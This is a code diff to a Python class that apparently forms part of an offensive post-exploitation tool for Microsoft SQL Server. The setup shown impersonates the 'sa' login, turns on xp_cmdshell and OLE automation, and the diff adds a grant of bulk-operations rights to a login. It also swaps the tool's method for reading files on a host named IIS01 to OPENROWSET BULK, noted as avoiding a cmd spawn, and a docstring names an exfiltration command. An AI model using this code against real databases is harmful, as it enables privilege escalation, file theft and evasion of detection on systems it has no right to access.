@@ -77,6 +77,7 @@ class XpMssqlBase:
             "EXECUTE AS LOGIN='sa';"
             "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
             "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
+            f"GRANT ADMINISTER BULK OPERATIONS TO [{self._tsql_escape(login)}];"
         )
         self._exec_q(shell, setup)
         out = self._exec_q(shell,
@@ -175,20 +176,12 @@ class XpMssqlBase:
         print(out)
 
     def cmd_xpfile_cat(self, shell, path: str):
-        """Read text file on IIS01 via sp_OA ADODB.Stream (no cmd spawn)."""
+        """Read text file on IIS01 via OPENROWSET BULK (no cmd spawn).
+        Requires ADMINISTER BULK OPERATIONS (granted in Phase 3 for xpexfil-hex)."""
         out = self._exec_q(shell,
             "EXECUTE AS LOGIN='sa';"
-            "DECLARE @s INT,@text NVARCHAR(MAX);"
-            "EXEC sp_OACreate 'ADODB.Stream',@s OUT;"
-            "EXEC sp_OASetProperty @s,'Type',2;"
-            "EXEC sp_OASetProperty @s,'Charset','ascii';"
-            "EXEC sp_OAMethod @s,'Open';"
-            f"EXEC sp_OAMethod @s,'LoadFromFile',NULL,"
-            f"'{self._tsql_escape(path)}';"
-            "EXEC sp_OAGetProperty @s,'ReadText',@text OUT;"
-            "SELECT @text AS content;"
-            "EXEC sp_OAMethod @s,'Close';"
-            "EXEC sp_OADestroy @s;"
+            "SELECT CAST(BulkColumn AS NVARCHAR(MAX)) AS content "
+            f"FROM OPENROWSET(BULK '{self._tsql_escape(path)}',SINGLE_CLOB) AS x;"
         )
         print(out)
 
